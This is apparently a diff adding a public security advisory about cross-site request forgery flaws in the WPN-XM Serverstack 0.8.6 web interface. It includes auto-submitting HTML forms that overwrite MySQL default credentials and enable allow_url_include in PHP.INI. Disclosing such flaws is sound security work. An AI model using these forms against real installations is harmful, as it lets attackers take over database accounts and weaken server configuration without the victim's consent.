@@ -1,0 +1,113 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/WPNXM-CSRF.txt
+
+
+Vendor:
+===========
+wpn-xm.org
+
+
+Product:
+==============================================
+WPN-XM Serverstack for Windows - Version 0.8.6
+
+WPN-XM is a free and open-source web server solution stack for professional
+PHP development on the Windows platform.
+
+
+Vulnerability Type:
+================================
+CSRF - MySQL / PHP.INI Hijacking
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+WPN-XMs webinterface is prone to multiple CSRF entry points allowing remote
+attackers to compromise an authenticated user if they visit
+a malicious webpage or click an attacker supplied link. Attackers can
+modify the 'PHP.INI' file to change arbitrary PHPs settings
+like enable 'allow_url_include' or changing the default MySQL username &
+password settings etc...
+
+
+Exploit code(s):
+===============
+
+
+1) Hijack MySQL Account Default Settings
+
+
+<iframe name="ifrm" width="600" height="700" name="hidden-form"></iframe>
+
+
+<form target="ifrm" id="CSRF-MySQL-Username" method="post" action="
+http://localhost/tools/webinterface/index.php?page=config&action=update-phpini-setting
+">
+<input type="hidden" name="page" value="config">
+<input type="hidden" name="action" value="update-phpini-setting">
+<input type="hidden" name="directive" value="mysql.default_user" />
+<input type="hidden" name="value" value="hyp3rlinx" />
+<script>document.getElementById('CSRF-MySQL-Username').submit()</script>
+</form>
+
+<form target="ifrm" id="CSRF-MySQL-PWD" method="post" action="
+http://localhost/tools/webinterface/index.php?page=config&action=update-phpini-setting
+">
+<input type="hidden" name="page" value="config">
+<input type="hidden" name="action" value="update-phpini-setting">
+<input type="hidden" name="directive" value="mysql.default_password">
+<input type="hidden" name="value" value="PWNED!" />
+<script>document.getElementById('CSRF-MySQL-PWD').submit()</script>
+</form>
+
+
+2)  Hijack PHP.INI Settings
+
+<form id="CSRF-PHP-INI" method="post" action="
+http://localhost/tools/webinterface/index.php?page=config&action=update-phpini-setting
+">
+<input type="hidden" name="directive" value="allow_url_include" />
+<input type="hidden" name="value" value="On" />
+<script>document.getElementById('CSRF-PHP-INI').submit()</script>
+</form>
+
+
+
+Disclosure Timeline:
+=====================================
+Vendor Notification: No Reply
+April 9, 2016 : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+================
+Medium
+
+
+=================================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
